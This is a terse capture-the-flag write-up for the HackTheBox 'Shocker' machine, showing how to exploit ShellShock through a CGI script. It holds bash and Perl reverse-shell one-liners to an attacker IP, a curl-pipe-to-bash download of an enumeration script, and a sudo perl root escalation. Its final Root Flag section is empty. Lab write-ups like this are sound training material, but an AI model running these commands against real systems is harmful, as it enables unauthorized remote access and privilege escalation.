# HackTheBox Shocker Writeup

![date](https://img.shields.io/badge/date-02.20.2019-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-0-blue.svg)
![solves](https://img.shields.io/badge/solves-3144-brightgreen.svg)

## Detailed Solution

### gobuster scan

Use -s flag to get specified error code.
    > gobuster -u http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt -s 200,204,301,302,304,403 
    > gobuster -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 200,203,301,302,304,403 -x sh,pl
    
Go to http://10.10.10.56/cgi-bin/user.sh

### ShellShock Exploit

#### Use shellshoch nmap script to scan target.
Make Burp listen on port 8081, and redirect any traffic from 10.10.10.56 to localhost.

    > nmap -sV -p8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1

#### ShellShock script may not work, so you need to modify the script to make it work.

    > vim /usr/share/nmap/scripts/http-shellshock.nse

### Reverse shell cheat sheet.

    > nc -lvnp 4444
    > bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
    > python -c 'import pty;pty.spawn("/bin/bash")'

### LinEnum 
    > python -m SimpleHTTPServer 8080
    > curl 10.10.14.5:8080/LinEnum.sh | bash
    > cd /dev/shm
    > /usr/bin/perl -e 'use Socket;$i="10.10.14.5";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    > sudo /usr/bin/perl -e 'exec("/bin/bash")'
    > nc -lvnp 4445
    
## Root Flag
    
    
